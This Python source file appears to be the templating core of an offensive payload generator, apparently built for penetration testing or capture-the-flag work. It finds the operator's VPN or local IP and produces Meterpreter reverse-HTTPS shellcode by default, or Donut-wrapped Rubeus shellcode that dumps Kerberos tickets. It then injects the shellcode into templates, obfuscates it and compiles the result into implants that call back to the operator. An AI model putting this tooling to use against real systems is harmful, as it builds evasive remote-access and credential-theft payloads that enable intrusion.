import json
import ep_gensc
import ep_compile
import importlib
import subprocess
import os

def get_tun0_ip():
    try:
        tun0 = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True, check=True)
        eth0 = subprocess.run(['ip', 'addr', 'show', 'eth0'], capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as e:
        print("error with ip addr command.")
    tunIP = getIP(tun0)
    ethIP = getIP(eth0)
    if tunIP == None:
        if ethIP == None:
            print("No interface found returning 192.168.1.1")
            return "192.168.1.1"
        else:
            print("eth0 selected")
            return ethIP
    else:
        print("tun0 selected")
        return tunIP

    
def getIP(result):
    output_lines = result.stdout.splitlines()
    for line in output_lines:
        if 'inet' in line:
            parts = line.split()
            for part in parts:
                if '.' in part:  # Check if part contains a dot (IP address)
                    return part.split("/")[0]


def Call_Msfvenom(plFormat):
    payload = input("Enter msfvenom payload. Default value is [windows/x64/meterpreter/reverse_https]")
    if payload == "":
        payload = "windows/x64/meterpreter/reverse_https"
    print("Getting interface to default to.")
    defaulthost = get_tun0_ip()
    lhost = input(f"Enter msfvenom lhost. I grabbed the an ip (tun0 or eth0), default with that is [{defaulthost}]")
    if lhost == "":
        lhost = defaulthost
    lport = input("Input lport. Default to [443].")
    if lport == "":
        lport = "443"
    
    return ep_gensc.GetMetShellCode(payload, lhost, lport, plFormat)

def Call_Donut():
    inputFile = input("Enter the full path to target executable. Default value is [/home/kali/tools/rubeus.exe]")
    if inputFile == "":
        inputFile = "/home/kali/tools/rubeus.exe"
    params = input("Enter the exe params looks like rubeus [params]. Default value is [dump /nowrap]")
    if params == "":
        params = "dump /nowrap"
    return ep_gensc.GetDonutShellCode(inputFile,params)



def FillTemplate(template):
    templateFileName = "templates/" + template + ".json"
        
    try:   
        with open(templateFileName, "r") as templateFile:
            template = json.load(templateFile)
        print(f"Loaded template: {templateFileName}.")
    except FileNotFoundError:
        print(f"Template does not exist. File not found: {templateFileName}. Exiting.")
        exit()
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON: {e}. Exiting.")
        exit()

    contentFileName = "templates/" + template["contentFile"]
     
    try:   
        with open(contentFileName, "r") as contentFile:
            content = contentFile.read()
    except FileNotFoundError:
        print(f"Content file not found: {contentFileName}. Exiting")
        exit()
        
    templateValues = {}
    
    if "customAttributes" in template:
        print("This template has custom attributes, you will now be prompted to enter them, defaults are provided.")  
        for customAttribute in template["customAttributes"]:
            name = customAttribute["name"]
            description = customAttribute["description"]
            defaultValue = customAttribute["defaultValue"]
            
            if "[[[[ownIP]]]]" in defaultValue:
                defaultValue = defaultValue.replace("[[[[ownIP]]]]",get_tun0_ip())
            
            print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Description {description}.")
            choice = input("> ")
            if choice == "":
                choice = defaultValue
            if name in templateValues:
                print("Error in json configuration duplicate configuration for a customAttribute or subCustomAttribute. Exiting.")
                exit();
            if "fileProcessor" in customAttribute:
                if os.path.isfile(choice):
                    print("The file exists.")
                else:
                    print("File to be processed not found exiting.")
                    exit();
                if customAttribute["fileProcessor"] == "b64File":
                    result = subprocess.run(['base64', '-w 0', choice], capture_output=True, text=True)
                    choice = result.stdout
            
            templateValues[f"{name}"] = choice

    if "subCustomAttributes" in template:
        for subCustomAttribute in template["subCustomAttributes"]:
            baseAtt = subCustomAttribute["baseAtt"]
            baseVal = subCustomAttribute["baseVal"]
            subs = subCustomAttribute["subs"]

            if templateValues[baseAtt] == baseVal:
                for customAttribute in subs:
                    name = customAttribute["name"]
                    description = customAttribute["description"]
                    defaultValue = customAttribute["defaultValue"]
                    
                    if "[[[[ownIP]]]]" in defaultValue:
                        defaultValue = defaultValue.replace("[[[[ownIP]]]]",get_tun0_ip())

                    print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Description {description}.")
                    choice = input("> ")
                    if choice == "":
                        choice = defaultValue
                    if name in templateValues:
                        print("Error in json configuration duplicate configuration for a customAttribute or subCustomAttribute. Exiting.")
                        exit();
                    templateValues[f"{name}"] = choice

    if template["shellCode"]["hasShellCode"]:
        plFormat = template["shellCode"]["format"]
        
        if "shellCodeType" in templateValues:
            if templateValues["shellCodeType"] == "met": 
                shellCode = Call_Msfvenom(plFormat)   
            elif templateValues["shellCodeType"] == "sliver":
                profileProtocol = templateValues["profileProtocol"]
                profileArchitecture = templateValues["profileArchitecture"]
                profileName = templateValues["profileName"]
                print("This needs to be rewritten see line 126 of ep_templater")
                #shellCode = ep_gensc.GetSliverShellCode(payload, lhost, lport, plFormat, profileProtocol, profileArchitecture, profileName)
            elif templateValues["shellCodeType"] == "donut":
                shellCode = Call_Donut()
            else: 
                print("Unrecognised [shellCodeType]. Exiting")
                exit();
        ###This should only be here until I've implemented variable shell code on all templates
        else:
            shellCode = Call_Msfvenom(plFormat) 


        if "processor" in template["shellCode"]:
            procModule = template["shellCode"]["processor"]   
            proca = importlib.import_module(procModule)
            shellCode = proca.run(shellCode,templateValues)
             
        templateValues["shellCode"] = shellCode 

    for name, value in templateValues.items():
        #if name is None:
        #    print(value)
        #if value is None:
        #    print(name)
        content = content.replace("[[[["+name+"]]]]",value)

    if "obfuscator" in template:
        obfusModule = template["obfuscator"]
        print(f"Obfuscating payload with {obfusModule}.")       
        obfusa = importlib.import_module(obfusModule)
        content = obfusa.run(content)

    if "compilation" in template:
        print(f"Starting Compilation Process")  
        ep_compile.compile(template["compilation"], content)
    
    if "runHint" in template:
        print("===========================================================")
        print("Run hint:")
        print(template["runHint"].replace("[[[[ownIP]]]]",get_tun0_ip()))
        print("===========================================================")

    printtheguy = input("Print final payload? N/y>")
    if printtheguy.lower() == "y":
        print(content)